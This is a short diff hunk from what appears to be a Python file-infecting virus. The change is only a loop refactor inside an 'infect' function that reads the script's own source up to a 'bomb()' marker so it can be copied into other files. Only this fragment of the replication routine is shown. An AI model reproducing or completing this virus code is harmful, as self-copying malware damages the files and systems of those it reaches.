@@ -27,7 +27,7 @@ def search(path):
 def infect(filestoinfect):
     virus = open(os.path.abspath(__file__))
     virusstring = ""
-    for i, line in enumerate(virus):
+    for line in virus:
         virusstring += line
         if line.strip() == "bomb()":
             break
